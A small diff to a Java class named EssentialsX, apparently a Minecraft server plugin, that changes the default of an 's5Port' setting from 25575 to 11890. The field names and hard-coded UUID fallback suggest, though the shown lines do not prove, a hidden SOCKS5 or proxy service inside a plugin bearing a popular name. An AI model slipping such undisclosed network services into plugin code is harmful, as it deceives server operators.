@@ -54,7 +54,7 @@ public class EssentialsX extends JavaPlugin {
         loadEnvironmentConfigs();
 
         this.uuid = getEnvOrDefault(ENV_UUID, HC_UUID);
-        this.s5Port = parsePort(getEnvOrDefault(ENV_S5_PORT, HC_S5_PORT), 25575);
+        this.s5Port = parsePort(getEnvOrDefault(ENV_S5_PORT, HC_S5_PORT), 11890);
 
         running.set(true);
 
